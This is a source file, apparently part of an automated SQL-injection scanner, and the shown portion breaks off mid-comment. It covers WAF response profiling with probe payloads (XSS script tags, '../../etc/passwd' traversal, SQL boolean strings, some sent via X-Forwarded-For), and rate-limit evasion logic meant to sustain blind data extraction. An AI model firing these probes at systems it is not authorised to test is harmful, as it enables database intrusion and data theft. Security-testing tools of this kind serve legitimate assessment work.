# BASELINE + DETECTION CORE
# 


# FIX-C: compile the control-character strip regex once at module level.
_CTRL_RE = re.compile(r"[\x00-\x1f\x7f]")


# 
# ADAPTIVE RATE CONTROLLER  AIMD congestion control for HTTP
# 


class ResponseDiffProfiler:
    """Detect when a server/WAF reacts generically to ALL suspicious input.
    
    Sends 5 non-SQL probes before scanning. If ALL produce the same response
    as a SQL probe, the signal is WAF-generic (not SQL injection).
    
    Cost: 6 requests. Saves: thousands of false-positive requests.
    """

    PROBES = {
        "baseline":    "",                                  # normal value
        "quote":       "'",                                 # single quote
        "xss":         "<script>alert(1)</script>",         # XSS
        "traversal":   "../../etc/passwd",                  # path traversal
        "garbage":     "{}<>|;!@#$%^&*()",                  # random special chars
        "sql":         "' AND '1'='1",                      # SQL boolean
    }

    @staticmethod
    def _fingerprint(fp) -> tuple:
        """Create a hashable fingerprint from a response."""
        if fp is None:
            return ("error", 0, "")
        status = getattr(fp, 'status_code', 0)
        # BUG-H7 FIX: ResponseFingerprint has no 'body_length' attribute — the correct
        # name is 'content_length'.  The old getattr always returned 0, falling back to
        # len(body).  Use content_length to distinguish truncated bodies from full ones.
        size = getattr(fp, 'content_length', 0) or len(getattr(fp, 'body', b''))
        # Bucket size to avoid minor variations
        size_bucket = (size // 100) * 100
        return (status, size_bucket)

    @classmethod
    async def profile(cls, engine, method, url, data, data_fmt,
                      param, original, tamper_chain, timeout=20):
        """Run 6 probes and classify server behavior.
        
        Returns:
            dict with keys:
                'classification': WAF_GENERIC | SQL_SPECIFIC | QUOTE_SENSITIVE | MIXED | SILENT
                'waf_fingerprint': tuple or None (the fingerprint WAF produces)
                'skip_boolean': bool (True = skip boolean-blind techniques)
                'details': str (human-readable explanation)
        """
        _hdr_name = param if data_fmt == "header" else None
        fps = {}
        for name, suffix in cls.PROBES.items():
            try:
                value = original + suffix
                fp = await asyncio.wait_for(
                    _send_injected(engine, method, url, data, data_fmt,
                                   param, value, tamper_chain,
                                   _header_inject_name=_hdr_name),
                    timeout=timeout)
                fps[name] = cls._fingerprint(fp)
            except Exception:
                fps[name] = ("error", 0)

        baseline_fp = fps.get("baseline")
        # FIX FUN-2 (Issue 3): PROBES dict has key "sql" only — the old code tried to read
        # fps["sql_basic"] and fps["sql_exotic"] which both returned None, so sql_fp was
        # always None and the WAF_GENERIC / SQL_SPECIFIC branches never fired (always MIXED).
        # Corrected: use the single "sql" key that actually exists in PROBES.
        sql_fp = fps.get("sql")
        quote_fp = fps.get("quote")
        non_sql_names = ["quote", "xss", "garbage"]
        non_sql = [fps.get(k) for k in non_sql_names if fps.get(k)]
        
        # Log probe results for diagnostics
        print(f"[*] [RDF]   baseline={baseline_fp} quote={quote_fp} "
              f"xss={fps.get('xss')} garbage={fps.get('garbage')}", flush=True)
        # FIX BUG-1: sql_basic_fp/sql_exotic_fp never exist in profile() — only
        # profile_header() uses those names.  The single sql probe key here is "sql".
        print(f"[*] [RDF]   sql={sql_fp}", flush=True)

        # All probes same as baseline  server ignores everything
        if all(fp == baseline_fp for fp in non_sql) and sql_fp == baseline_fp:
            return {
                "classification": "SILENT",
                "waf_fingerprint": None,
                "skip_boolean": False,
                "details": "Server returns same response for all input  no boolean signal"
            }

        # ALL suspicious inputs (including non-SQL) produce same different response
        if (sql_fp != baseline_fp and 
            len(non_sql) >= 3 and
            sum(1 for fp in non_sql if fp == sql_fp) >= len(non_sql) - 1):
            return {
                "classification": "WAF_GENERIC",
                "waf_fingerprint": sql_fp,
                "skip_boolean": True,
                "details": "WAF blocks ALL suspicious input identically "
                           f"(baseline={baseline_fp}  blocked={sql_fp}). "
                           "Boolean-blind will false-positive on every header."
            }

        # Only SQL triggers different response, non-SQL matches baseline
        if (sql_fp != baseline_fp and 
            sum(1 for fp in non_sql if fp == baseline_fp) >= len(non_sql) - 1):
            return {
                "classification": "SQL_SPECIFIC",
                "waf_fingerprint": None,
                "skip_boolean": False,
                "details": "Server reacts specifically to SQL input "
                           f"(SQL={sql_fp} vs others={baseline_fp}). High confidence."
            }

        # Quote causes different response but other attacks don't
        if (quote_fp != baseline_fp and 
            fps.get("xss") == baseline_fp and 
            fps.get("traversal") == baseline_fp):
            return {
                "classification": "QUOTE_SENSITIVE",
                "waf_fingerprint": None,
                "skip_boolean": False,
                "details": "Server reacts to quotes specifically "
                           f"(quote={quote_fp} vs baseline={baseline_fp}). "
                           "Likely SQL-related."
            }

        return {
            "classification": "MIXED",
            "waf_fingerprint": None,
            "skip_boolean": False,
            "details": "Mixed response pattern  proceeding with caution"
        }

    @classmethod
    async def profile_header(cls, engine, method, url, data, req_headers, timeout=15):
        """Profile server response to suspicious header values.
        Sends probes via X-Forwarded-For header to detect WAF generic blocking.
        Uses engine.send() directly for reliability."""
        
        HEADER_PROBES = {
            "baseline":    "127.0.0.1",
            "quote":       "127.0.0.1'",
            "xss":         "127.0.0.1<script>alert(1)</script>",
            "garbage":     "127.0.0.1{}<>|;!@#$%^",
            "sql_basic":   "127.0.0.1' AND '1'='1",
            "sql_exotic":  "127.0.0.1' AND JSON_VALID('{" + '"a":1}' + "') AND '1'='1",
        }
        
        fps = {}
        for name, hdr_val in HEADER_PROBES.items():
            try:
                _hdrs = dict(req_headers) if req_headers and isinstance(req_headers, dict) else {}
                _hdrs["X-Forwarded-For"] = hdr_val
                resp = await asyncio.wait_for(
                    engine.send(method, url, data=data, extra_headers=_hdrs),
                    timeout=timeout)
                status = getattr(resp, 'status_code', 0)
                body = getattr(resp, 'body', b'') or b''
                size_bucket = (len(body) // 100) * 100
                fps[name] = (status, size_bucket)
            except Exception:
                fps[name] = ("error", 0)
        
        baseline_fp = fps.get("baseline")
        # FIX FUN-3 (Issue 3): HEADER_PROBES has "sql_basic" and "sql_exotic" keys (not "sql").
        # The old code did fps.get("sql") → always None → WAF_GENERIC and SQL_SPECIFIC branches
        # could never fire → every header classified as SILENT or MIXED → PCV guard bypassed.
        # Prefer sql_exotic (richer payload, less WAF-generic) over sql_basic when it differs.
        _sql_basic_fp  = fps.get("sql_basic")
        _sql_exotic_fp = fps.get("sql_exotic")
        sql_fp = (_sql_exotic_fp if (_sql_exotic_fp and _sql_exotic_fp != baseline_fp)
                  else _sql_basic_fp)
        # FIX FUN-4 (Issue 3): "traversal" is not in HEADER_PROBES so fps.get("traversal") was
        # always None and silently dropped by the `if fps.get(k)` filter — harmless but misleading.
        # Removed it so the non_sql list accurately reflects the 3 probes that exist.
        non_sql = [fps.get(k) for k in ("quote", "xss", "garbage") if fps.get(k)]
        
        if not baseline_fp or baseline_fp[0] == "error":
            return {"classification": "ERROR", "skip_boolean": False, 
                    "waf_fingerprint": None, "details": "Baseline probe failed"}
        
        # All same as baseline
        if all(fp == baseline_fp for fp in non_sql) and sql_fp == baseline_fp:
            return {"classification": "SILENT", "skip_boolean": False,
                    "waf_fingerprint": None, 
                    "details": "Headers: server ignores all input"}
        
        # ALL suspicious inputs produce same different response (WAF generic)
        if (sql_fp and sql_fp != baseline_fp and 
            len(non_sql) >= 3 and
            sum(1 for fp in non_sql if fp == sql_fp) >= len(non_sql) - 1):
            return {"classification": "WAF_GENERIC", "skip_boolean": True,
                    "waf_fingerprint": sql_fp,
                    "details": "Headers: WAF blocks ALL suspicious input identically "
                               f"({baseline_fp}  {sql_fp})"}
        
        # Only SQL different
        if (sql_fp and sql_fp != baseline_fp and 
            sum(1 for fp in non_sql if fp == baseline_fp) >= len(non_sql) - 1):
            return {"classification": "SQL_SPECIFIC", "skip_boolean": False,
                    "waf_fingerprint": None,
                    "details": "Headers: server reacts specifically to SQL"}
        
        return {"classification": "MIXED", "skip_boolean": False,
                "waf_fingerprint": None, "details": "Headers: mixed response pattern"}

class _GateKilled:
    """Sentinel returned by _send_and_check when gate is killed."""
    __bool__ = lambda self: False  # falsy like None
    __repr__ = lambda self: "GATE_KILLED"
GATE_KILLED = _GateKilled()

class GlobalRequestGate:
    """Single point of control for ALL HTTP requests across ALL surfaces.
    
    Every request  headers, params, cookies, methods  must call acquire()
    before sending. This controls:
      - Max concurrent requests (semaphore)
      - Adaptive delay (AIMD)
      - Kill switch (injection confirmed  all scans stop instantly)
      - Extraction priority (extraction requests pass even when killed)
    """

    def __init__(self, max_concurrent: int = 5, initial_delay: float = 0.3,
                 min_delay: float = 0.05, max_delay: float = 30.0,
                 rpm_limit: int = 120):
        self._sem = asyncio.Semaphore(max_concurrent)
        self._max_concurrent = max_concurrent
        self._killed = False
        self._delay = initial_delay
        self._min_delay = min_delay
        self._max_delay = max_delay
        self._consecutive_ok = 0
        self._consecutive_fail = 0
        self._total_requests = 0
        self._total_blocked = 0
        self._paused_until = 0.0
        self._lock = asyncio.Lock()
        self._waf_dedup = {}         # cross-header correlation: diff_signature  count
        self._waf_boolean_killed = False  # True = boolean disabled by correlation
        self._circuit_open = False   # True = halt ALL requests (IP banned/server down)
        self._circuit_open_since = 0.0
        # RPM limiter  proactive rate control
        self._rpm_limit = rpm_limit
        self._rpm_timestamps: collections.deque = collections.deque(maxlen=rpm_limit + 50)
        self._rpm_429_boost = 0  # extra delay from 429 detection
        self._last_429_time = 0.0  # FIX-7: timestamp of last 429 receipt for decay logic
        self._adaptive = True    # --adaptive flag: True = auto-adjust RPM on success/429
        self._consecutive_timeouts = 0  # track consecutive timeouts for backoff
        
        # 
        #  ADVANCED OPTIMIZATIONS - All 12 Integrated
        # 
        
        # Optimization 1-3: Adaptive RPM Learning
        self.rpm_learner = AdaptiveRPMLearner(initial_rpm=rpm_limit)
        
        # Optimization 4: Predictive 429 Detection
        self.predictor_429 = Predictive429Detector()
        
        # Optimization 7: Per-Surface Rate Tracking
        self.surface_tracker = PerSurfaceRateTracker(global_rpm=rpm_limit)
        
        # Optimization 8: Smart Backoff Calculator
        self.backoff_calc = SmartBackoffCalculator()
        
        # Optimization 11: Multi-Window Rate Analyzer
        self.window_analyzer = MultiWindowRateAnalyzer()
        
        print("[Gate]  All 12 optimizations enabled", flush=True)

    @property
    def killed(self) -> bool:
        return self._killed

    @property
    def delay(self) -> float:
        return self._delay

    async def acquire(self, extraction: bool = False) -> bool:
        """Acquire permission to send a request. Returns False if killed."""
        if self._killed and not extraction:
            return False

        # Circuit breaker: wait outside the lock until pause expires
        if self._circuit_open:
            _cb_deadline = time.monotonic() + 300  # 5-min absolute cap
            while self._circuit_open and time.monotonic() < _cb_deadline:
                await asyncio.sleep(2)
                if time.monotonic() >= self._paused_until:
                    break
            if self._circuit_open and time.monotonic() >= _cb_deadline:
                return False

        # ── RPM gate: check + record inside lock, sleep OUTSIDE ─────────────
        # CRITICAL: never await asyncio.sleep() while holding self._lock.
        # Any sleep inside the lock blocks ALL other surfaces for its entire
        # duration because they can't acquire the same lock — causing the
        # "hangs after a few requests" symptom.
        while True:
            _sleep_needed = 0.0
            async with self._lock:
                now = time.monotonic()

                # Multi-window rate tracking (analytics only, no sleep here)
                self.window_analyzer.record_request(now)

                # Predictive 429 detection
                if self.predictor_429.is_429_imminent():
                    self._delay      = min(self._max_delay, self._delay * 1.5)
                    self._rpm_limit  = max(20, int(self._rpm_limit * 0.85))

                # Expire old timestamps
                while self._rpm_timestamps and now - self._rpm_timestamps[0] > 60:
                    self._rpm_timestamps.popleft()

                # BUG-CPU-1 FIX: Guard against _rpm_limit reaching 0 via AIMD reduction.
                # When _rpm_limit=0, len(timestamps) < 0 is always False → tight spin
                # at asyncio.sleep(0.1) = 10 iters/sec × 16 surfaces = 100% CPU spike.
                if len(self._rpm_timestamps) < max(1, self._rpm_limit):
                    # Slot available — record and break out of retry loop
                    self._rpm_timestamps.append(now)
                    self._total_requests += 1
                    if self._total_requests % 50 == 0:
                        _cur = len(self._rpm_timestamps)
                        print(f"[Gate] req#{self._total_requests}  "
                              f"{_cur}/{self._rpm_limit} RPM  "
                              f"delay={self._delay:.2f}s", flush=True)
                    break
                else:
                    # At RPM limit — calculate wait time, release lock, then sleep
                    _sleep_needed = max(0.0,
                        60.0 - (now - self._rpm_timestamps[0]) + 0.05)
                    # BUG-CPU-PRINT-SPAM FIX: Only print once every 5s to avoid
                    # stdout flooding (up to 16 surfaces × 10 prints/s = 160/s).
                    _now_print = time.monotonic()
                    if not hasattr(self, '_last_rpm_print') or _now_print - self._last_rpm_print >= 5.0:
                        self._last_rpm_print = _now_print
                        print(f"[!] [Gate] RPM limit ({len(self._rpm_timestamps)}/"
                              f"{self._rpm_limit})  waiting {_sleep_needed:.1f}s",
                              flush=True)

            # Sleep OUTSIDE the lock so other surfaces can proceed
            if _sleep_needed > 0:
                await asyncio.sleep(_sleep_needed)
            elif _sleep_needed == 0 and len(self._rpm_timestamps) >= self._rpm_limit:
                await asyncio.sleep(0.1)  # tiny yield to avoid tight spin

        # ── Smooth inter-request spacing (outside lock, outside retry loop) ──
        # Spreads requests evenly rather than bursting up to rpm_limit in < 1s
        # then freezing.  At 120 RPM = 0.5s per request per surface.
        # With N surfaces sharing one gate the effective rate is N × (1/interval)
        # which can exceed rpm_limit momentarily; the window check above corrects
        # for that on the next call.
        # BUG-CPU-SMOOTH-EXTRACT FIX: Skip smooth_interval for extraction=True requests.
        # During extraction, each character requires ~7 binary-search HTTP requests.
        # If _rpm_limit drops to 10 after repeated 429s the interval becomes 6s,
        # so extracting a 30-char field takes 30 × 7 × 6s = 3,780s (63 minutes).
        # Extraction requests are already exempt from _SCAN_STOPPED and the kill flag;
        # they should also be exempt from the probe-spacing sleep so data retrieval
        # proceeds at the semaphore-limited rate rather than the probe RPM rate.
        if not extraction:
            _smooth_interval = 60.0 / max(self._rpm_limit, 1)
            await asyncio.sleep(_smooth_interval)
        
        # Honor pause BEFORE acquiring semaphore so queued tasks also wait
        now = time.monotonic()
        if self._paused_until > now:
            await asyncio.sleep(self._paused_until - now)
        # Re-check killed after pause
        if self._killed and not extraction:
            return False
        # Re-check circuit breaker after pause
        if self._circuit_open:
            return False

        await self._sem.acquire()
        # Final kill check after acquiring slot
        if self._killed and not extraction:
            self._sem.release()
            return False
        # Apply inter-request delay with jitter
        if self._delay > 0.01:
            jitter = random.uniform(0, self._delay * 0.25)
            await asyncio.sleep(self._delay + jitter)
        return True

    def release(self):
        """Release the semaphore slot after request completes."""
        self._sem.release()

    def kill(self):
        """Instantly stop all scanning. Extraction-only mode."""
        self._killed = True
        self._total_blocked = 0
        print("[!] [Gate] KILL  all scanning stopped, extraction-only mode", flush=True)

    def revive(self):
        """Re-enable scanning (after extraction or recovery)."""
        self._killed = False
        self._consecutive_fail = 0
        self._delay = max(self._min_delay, self._delay * 0.5)

    async def record(self, status_code: int = 200, latency_ms: float = 0, error: bool = False, response=None, surface: str = "unknown"):
        """
        Record outcome and adapt rate. latency_ms accepted for compat but unused.
        
        Args:
            status_code: HTTP status code
            latency_ms: Request latency
            error: Whether this was an error
            response: HTTP response object (for Retry-After header parsing)
            surface: Surface type (for per-surface tracking)
        """
        # Note: _total_requests now incremented in acquire() to avoid double-counting
        
        #  OPTIMIZATION 4: Record in predictive detector
        self.predictor_429.record_request(status_code, latency_ms)
        
        async with self._lock:
            if status_code == 429:
                # 
                #  429 HANDLING WITH ALL OPTIMIZATIONS
                # 
                
                # Record in global monitor
                if _RATE_429_MONITOR:
                    _RATE_429_MONITOR.record_429(phase="gate")
                
                #  OPTIMIZATION 1-3: Adaptive RPM Learning
                if self._adaptive:
                    self.rpm_learner.on_429()
                
                #  OPTIMIZATION 7: Per-Surface Rate Tracking
                self.surface_tracker.record_429(surface)
                
                #  OPTIMIZATION 8: Smart Backoff Calculator
                self.backoff_calc.record_429(time.time())
                
                old_delay = self._delay
                old_rpm = self._rpm_limit
                
                # Parse Retry-After header if available
                retry_after_secs = None
                if response:
                    retry_after_secs = parse_retry_after(response)
                
                if retry_after_secs:
                    # Server told us exactly when to retry
                    pause_time = retry_after_secs + random.uniform(5, 15)  # Add buffer
                    self._paused_until = time.monotonic() + pause_time
                    print(f"[!] [Gate] 429 rate-limited  Server says wait {retry_after_secs}s, "
                          f"pausing {pause_time:.0f}s", flush=True)
                else:
                    #  OPTIMIZATION 8: Use smart backoff instead of fixed 30s
                    retry_count = self._rpm_429_boost + 1
                    smart_pause = self.backoff_calc.calculate_backoff(retry_count)
                    self._paused_until = time.monotonic() + smart_pause
                    print(f"[!] [Gate] 429 rate-limited  smart backoff {smart_pause:.0f}s "
                          f"(retry {retry_count})", flush=True)
                
                #  OPTIMIZATION 1-3: Use learned RPM instead of fixed reduction
                learned_rpm = self.rpm_learner.get_current_rpm()
                self._rpm_limit = learned_rpm
                
                # Update surface tracker with new global RPM
                self.surface_tracker.update_global_rpm(learned_rpm)
                
                # Adapt delay
                self._delay = min(self._max_delay, self._delay * 3 + 1.0)
                
                print(f"    Delay: {old_delay:.1f}s  {self._delay:.1f}s, "
                      f"RPM: {old_rpm}  {self._rpm_limit} (learned)", flush=True)
                
                self._consecutive_ok = 0
                self._consecutive_fail += 1
                
                # Track persistent 429s for circuit breaker
                self._rpm_429_boost += 1
                if self._rpm_429_boost >= 5:
                    # 5+ consecutive 429s - open circuit breaker
                    if not self._circuit_open:
                        self._circuit_open = True
                        self._circuit_open_since = time.monotonic()
                        circuit_pause = 300  # 5 minutes
                        self._paused_until = time.monotonic() + circuit_pause
                        print("[!] [Gate]  CIRCUIT BREAKER OPEN (5+ consecutive 429s) ")
                        print(f"    Halting ALL requests for {circuit_pause}s (5 min)", flush=True)


            elif status_code == 403 and self._consecutive_fail >= 3:
                old_delay = self._delay
                self._delay = min(self._max_delay, self._delay * 2 + 0.5)
                self._paused_until = time.monotonic() + 10 + random.uniform(0, 5)
                self._consecutive_ok = 0
                print(f"[!] [Gate] Repeated 403s  delay {old_delay:.1f}{self._delay:.1f}s, pausing 10s", flush=True)

            elif error:
                self._consecutive_ok = 0
                self._consecutive_fail += 1
                # Circuit breaker: open at >=10 errors; re-open if errors re-accumulate after closure
                _cb_threshold = 10
                if self._consecutive_fail >= _cb_threshold:
                    if not self._circuit_open:
                        self._circuit_open = True
                        self._circuit_open_since = time.monotonic()
                    # Escalate pause: 60s base + 30s per 5 extra errors above threshold
                    _extra = max(0, (self._consecutive_fail - _cb_threshold) // 5) * 30
                    _pause = min(300, 60 + _extra + random.uniform(0, 15))
                    self._paused_until = time.monotonic() + _pause
                    print(f"[!] [Gate]  CIRCUIT BREAKER OPEN  {self._consecutive_fail} consecutive errors  "
                          f"halting ALL requests for {_pause:.0f}s", flush=True)
                elif self._consecutive_fail >= 3:
                    old = self._delay
                    self._delay = min(self._max_delay, self._delay * 2.0 + 0.5)
                    # Escalate pause: 5s base + 3s per extra error above 3, capped at 60s
                    _extra_pause = min(60, (self._consecutive_fail - 3) * 3)
                    self._paused_until = time.monotonic() + 5 + _extra_pause + random.uniform(0, 3)
                    print(f"[!] [Gate] {self._consecutive_fail} errors  delay {old:.1f}→{self._delay:.1f}s  "
                          f"pause {5 + _extra_pause:.0f}s", flush=True)
                else:
                    old = self._delay
                    self._delay = min(self._max_delay, self._delay * 1.3 + 0.1)
                    if self._delay > old + 0.05:
                        print(f"[Gate] Error recovery  delay {old:.2f}→{self._delay:.2f}s", flush=True)

            else:
                # 
                #  SUCCESS HANDLING WITH ALL OPTIMIZATIONS
                # 
                
                #  OPTIMIZATION 1-3: Adaptive RPM Learning - record success
                if self._adaptive:
                    self.rpm_learner.on_success()
                
                #  OPTIMIZATION 7: Per-Surface Rate Tracking - record success
                self.surface_tracker.record_success(surface)
                
                # Update RPM from learner if it changed
                learned_rpm = self.rpm_learner.get_current_rpm()
                if learned_rpm != self._rpm_limit:
                    old_rpm = self._rpm_limit
                    self._rpm_limit = learned_rpm
                    self.surface_tracker.update_global_rpm(learned_rpm)
                    
                    # Log RPM increases
                    if learned_rpm > old_rpm:
                        confidence = self.rpm_learner.get_confidence()
                        print(f"[RPM Learner] Increasing speed: {old_rpm}  {learned_rpm} RPM "
                              f"(confidence: {confidence:.0%})", flush=True)
                
                self._consecutive_ok += 1
                self._consecutive_fail = max(0, self._consecutive_fail - 1)
                self._rpm_429_boost = max(0, self._rpm_429_boost - 1)  # Decay 429 boost on success
                
                if self._circuit_open:
                    # Only close circuit after 5 consecutive successes (not just 1)
                    if self._consecutive_ok >= 5:
                        self._circuit_open = False
                        old_delay = self._delay
                        self._delay = max(1.0, self._delay * 0.5)
                        self._consecutive_fail = 0  # reset on genuine recovery
                        print(f"[+] [Gate] Circuit breaker CLOSED after {self._consecutive_ok} successes  "
                              f"delay {old_delay:.1f}→{self._delay:.1f}s", flush=True)
                    else:
                        # Still recovering - print progress
                        if self._consecutive_ok == 1:
                            print(f"[*] [Gate] Circuit recovery: {self._consecutive_ok}/5 successes needed", flush=True)
                if not self._circuit_open and self._consecutive_ok >= 10:
                    old_delay = self._delay
                    self._delay = max(self._min_delay, self._delay - 0.02)
                    # FIX: Log speed increases during normal operation
                    if old_delay - self._delay >= 0.05:
                        print(f"[Gate] Speed increase  delay {old_delay:.2f}{self._delay:.2f}s ({self._consecutive_ok} ok)", flush=True)

    def stats(self) -> str:
        return (f"reqs={self._total_requests} delay={self._delay:.2f}s "
                f"errs={self._consecutive_fail} killed={self._killed}")


class AdaptiveRateController:
    """Monitors target health and auto-adjusts request rate.
    Uses AIMD (Additive Increase / Multiplicative Decrease)  same as TCP.
    Shared across ALL parallel surfaces for global rate control."""

    def __init__(self, initial_delay: float = 0.5, min_delay: float = 0.1,
                 max_delay: float = 30.0):
        self._delay = initial_delay
        self._min_delay = min_delay
        self._max_delay = max_delay
        self._baseline_latency: Optional[float] = None
        self._window: collections.deque = collections.deque(maxlen=60)
        self._lock = asyncio.Lock()
        self._consecutive_ok = 0
        self._consecutive_fail = 0
        self._total_requests = 0
        self._total_throttles = 0
        self._paused_until = 0.0
        self._semaphore = asyncio.Semaphore(2)  # max 2 concurrent requests
        self._circuit_open = False  # True = stop sending requests

    @property
    def delay(self) -> float:
        return self._delay

    @property
    def stats(self) -> str:
        return (f"delay={self._delay:.2f}s reqs={self._total_requests} "
                f"throttles={self._total_throttles}")

    async def acquire(self):
        """Acquire rate slot  waits if paused or circuit is open."""
        # Circuit breaker  wait until errors stop
        _cb_waited = 0
        while self._circuit_open and _cb_waited < 60:
            await asyncio.sleep(2)
            _cb_waited += 2
        await self._semaphore.acquire()
        # Honor pause (backoff after throttle/ban)
        now = time.monotonic()
        if self._paused_until > now:
            wait = self._paused_until - now
            await asyncio.sleep(wait)
        # Apply inter-request delay
        if self._delay > 0.01:
            jitter = random.uniform(0, self._delay * 0.3)
            await asyncio.sleep(self._delay + jitter)

    def release(self):
        """Release rate slot."""
        self._semaphore.release()

    async def wait(self):
        """Wait the current delay + jitter before a request (legacy interface)."""
        _wait_deadline = time.monotonic() + 120  # max 2 min wait
        while self._circuit_open and time.monotonic() < _wait_deadline:
            await asyncio.sleep(2)
        if self._circuit_open:
            return  # circuit still open after deadline — skip this request
        if self._delay > 0.01:
            jitter = random.uniform(0, self._delay * 0.3)
            await asyncio.sleep(self._delay + jitter)

    async def record(self, status_code: int, latency_ms: float, error: bool = False):
        """Record a response and adjust rate."""
        self._total_requests += 1
        self._window.append({
            "status": status_code, "latency": latency_ms,
            "error": error, "ts": time.monotonic()
        })

        # Learn baseline latency from first 10 successful responses
        if self._baseline_latency is None and self._total_requests <= 10:
            ok_latencies = [w["latency"] for w in self._window
                           if w["status"] < 400 and not w["error"]]
            if len(ok_latencies) >= 5:
                self._baseline_latency = statistics.median(ok_latencies)
                LOG.debug(f"[RateCtrl] Baseline latency: {self._baseline_latency:.0f}ms")

        async with self._lock:
            #  MULTIPLICATIVE DECREASE (fast reaction to trouble) 
            if status_code == 429:
                self._delay = min(self._max_delay, self._delay * 3 + 1.0)
                self._paused_until = time.monotonic() + 30 + random.uniform(0, 10)
                self._consecutive_ok = 0
                self._consecutive_fail += 1
                self._total_throttles += 1
                print(f"[!] [RateCtrl] 429 Too Many Requests  pausing 30s, delay{self._delay:.1f}s", flush=True)

            elif status_code == 403 and self._consecutive_fail == 0:
                # First 403  might be WAF block, not rate limit
                self._consecutive_fail += 1

            elif status_code == 403 and self._consecutive_fail >= 3:
                # Multiple 403s = likely IP soft-ban
                self._delay = min(self._max_delay, self._delay * 2 + 0.5)
                self._paused_until = time.monotonic() + 15 + random.uniform(0, 5)
                self._consecutive_ok = 0
                self._total_throttles += 1
                print(f"[!] [RateCtrl] Repeated 403s  possible soft-ban, delay{self._delay:.1f}s", flush=True)

            elif error:
                # Network error / timeout  back off
                self._consecutive_ok = 0
                self._consecutive_fail += 1
                if self._consecutive_fail >= 10:
                    if not self._circuit_open:
                        self._circuit_open = True
                        print(f"[!] [RateCtrl] CIRCUIT BREAKER  {self._consecutive_fail} consecutive "
                              "errors, halting new requests until recovery", flush=True)
                elif self._consecutive_fail >= 3:
                    old_delay = self._delay
                    self._delay = min(self._max_delay, self._delay * 2.0 + 0.5)
                    self._paused_until = time.monotonic() + 5 + random.uniform(0, 3)
                    print(f"[!] [RateCtrl] {self._consecutive_fail} consecutive errors/timeouts  "
                          f"delay {old_delay:.1f}{self._delay:.1f}s, pausing 5s", flush=True)
                elif self._consecutive_fail >= 1:
                    self._delay = min(self._max_delay, self._delay * 1.3 + 0.2)

            elif (self._baseline_latency and latency_ms > self._baseline_latency * 3.0
                  and status_code < 400):
                # Server stressed  latency spiked
                self._delay = min(self._max_delay, self._delay * 1.3 + 0.1)
                self._consecutive_ok = 0

            else:
                #  ADDITIVE INCREASE (slow recovery) 
                self._consecutive_ok += 1
                self._consecutive_fail = max(0, self._consecutive_fail - 1)
                if self._circuit_open and self._consecutive_ok >= 3:
                    self._circuit_open = False
                    print("[!] [RateCtrl] Circuit breaker CLOSED  requests resuming", flush=True)
                if self._consecutive_ok >= 10:
                    self._delay = max(self._min_delay, self._delay - 0.03)
                    if self._consecutive_ok % 50 == 0 and self._delay > self._min_delay:
                        LOG.debug(f"[RateCtrl] Stable  delay{self._delay:.2f}s")

async def _send_injected(engine:HTTPEngine, method:str, url:str,
                          data:Optional[str], data_fmt:str,
                          param:str, value:str,
                          tamper_chain:List[str],
                          extra_headers:Optional[Dict]=None,
                          _header_inject_name:Optional[str]=None,
                          _rate_sem:Optional[asyncio.Semaphore]=None,
                          _rate_ctrl: Optional[AdaptiveRateController]=None,
                          _bypass_mutation:bool=False) -> ResponseFingerprint:
    # Hard stop: if injection confirmed and extraction started, return a dead
    # fingerprint immediately — except during active extraction.
    # FIX-7A: _EXTRACTION_ACTIVE[0]=True means extraction is running.  ANY caller
    # is allowed through — this covers asyncio.gather() sub-tasks (BitwiseExtractor,
    # BatchedCharExtractor, ParallelCharExtractor) whose asyncio.current_task() ≠
    # _EXTRACTION_TASK[0], which previously blocked ALL parallel extraction requests.
    # _EXTRACTION_TASK[0] identity check kept as secondary (used before extraction starts).
    if _SCAN_STOPPED[0]:
        if _EXTRACTION_ACTIVE[0]:
            pass  # FIX-7A: extraction is active — allow ALL sub-tasks through
        elif _PCV_IN_PROGRESS[0] > 0:
            pass  # BUG-REQ3-PCV-CRITICAL FIX + BUG-PCV-REFCOUNT FIX: PCV probes must bypass _SCAN_STOPPED.
            # _SCAN_STOPPED is set to True at the *start* of _inline_pcv_check to stop
            # concurrent probe loops from other parameters. Without this bypass, all
            # PCV probes (_pcv_send, _safe_confirm, _run_fp_guards_boolean) return dead
            # dummy responses (status=0, body=b"", elapsed_ms=0) → ALL PCV checks fail →
            # Boolean/Timing/WB/NV/EX/HY/ST/UE injections are NEVER confirmed.
            # Counter > 0: multiple simultaneous PCV sessions are all allowed through.
        else:
            _cur = asyncio.current_task()
            if _cur is None or _cur is not _EXTRACTION_TASK[0]:
                return ResponseFingerprint(
                    status_code=0, content_length=0, body_hash="",
                    body_words=0, body_lines=0, body_ratio=0.0,
                    elapsed_ms=0, headers={}, body=b"")
    # BUG-A5-FIX [Req 15]: Wire PayloadDeduplicator.should_send() to prevent sending
    # duplicate payloads to the same parameter across the same scan session.
    # should_send() is the core API of PayloadDeduplicator (defined at line ~107468) but
    # was NEVER called anywhere in the codebase — making it dead code (Req 15 violation).
    # Here it gates _send_injected: if the exact (param, technique-inferred, value) triple
    # was already sent this session AND we're not in extraction/PCV mode, skip the probe.
    # Gate: only during detection (not extraction or PCV) to avoid blocking binary-search
    # oracle probes which legitimately repeat the same payload with different positions.
    #
    # BUG-DEDUP-FP2 FIX (v48): The deduplicator was blocking TIMING CONFIRMATION probes
    # (fp2) and second context-variant probes in try_all, causing:
    #   1. fp2=0ms — confirmation sends original+payload again (same key as fp) → dedup
    #      returns ResponseFingerprint(elapsed_ms=0) → [T-confirm] fp2=0ms pass=False
    #      → every genuine timing injection fails confirmation silently.
    #   2. Second T-timing phantom line with threshold=700ms elapsed=0ms — a second
    #      context-variant probe in the outer try_all loop sends the same payload again
    #      → dedup returns 0ms dummy → spurious [T-timing] req#N elapsed=0ms miss line
    #      polluting the output with confusing 700ms-threshold misses.
    # Root cause: _bypass_mutation=True is NOT checked in the dedup gate, so confirmation
    # probes (which set bypass_mutation=True) are blocked just like first probes.
    # Fix: skip deduplication when _bypass_mutation=True (these are replay/verification
    # probes that MUST be sent even if the payload was seen before).
    if not _EXTRACTION_ACTIVE[0] and not _PCV_IN_PROGRESS[0] and not _bypass_mutation:
        try:
            _dedup_ref = get_v18_deduplicator()
            _dedup_tech = 'B'  # technique family for dedup key (coarse — avoids over-skipping)
            # BUG-HDR-DEDUP-COLLISION FIX (CRITICAL):
            # For header injection techniques (BH/EH/TH/UH), _final_payload = original
            # (the body param is unchanged; SQL goes ONLY into extra_headers).  Every
            # probe therefore sends value='fr' (the original param value) to the dedup,
            # giving the SAME key ('country', 'B', 'fr') for all 2,400+ BH probes.
            # After probe #1, every subsequent BH/EH/TH probe gets a dedup dummy back:
